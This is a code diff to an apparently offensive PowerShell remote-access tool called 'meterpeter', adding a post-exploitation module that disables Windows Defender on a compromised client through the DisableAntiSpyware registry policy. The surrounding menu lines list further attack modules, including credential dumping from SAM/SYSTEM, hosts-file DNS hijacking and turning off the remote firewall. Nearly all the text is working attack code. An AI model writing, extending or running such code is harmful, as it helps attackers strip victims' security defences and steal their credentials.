@@ -868,6 +868,7 @@ While($Client.Connected)
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
       write-host "   Firewall  Turn On/Off Remote  Firewall    Client:Admin - Privileges Required";
+      write-host "   Defender  Turn On/off Windows Defender    Client:Admin - Privileges Required";
       write-host "   Dnspoof   Hijack Entrys in hosts file     Client:Admin - Privileges Required";
       write-host "   NoDrive   Hide Drives from Explorer       Client:Admin - Privileges Required";
       write-host "   DumpSAM   Dump SAM/SYSTEM Credentials     Client:Admin - Privileges Required";
@@ -1515,6 +1516,35 @@ While($Client.Connected)
         {
           write-host " Enable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state on;echo `"   [i] Remote Firewall Enabled (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+          $Command = $Null;
+          $choise_two = $Null;
+        }
+        $choise_two = $Null;
+      }
+      If($choise -eq "Defender" -or $choise -eq "defender")
+      {
+        write-host "`n   Requirements" -ForegroundColor Yellow;
+        write-host "   ------------";
+        write-host "   Attacker needs to restart target system for the changes take effect";
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Disable windows defender        Client:Admin - Privileges Required";
+        write-host "   Enable    Enable  windows defender        Client:Admin - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Defender> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Turn OFF Windows Defender .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-ItemProperty -Path `"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender`" -Name `"DisableAntiSpyware`" -Type DWord -Value 1 -Force;Get-ItemProperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware'|Select-Object PSchildName,DisableAntiSpyware|Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Turn ON Windows Defender .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-ItemProperty -Path `"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender`" -Name `"DisableAntiSpyware`" -ErrorAction SilentlyContinue;echo `"   [i] Windows Defender Active ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
         {
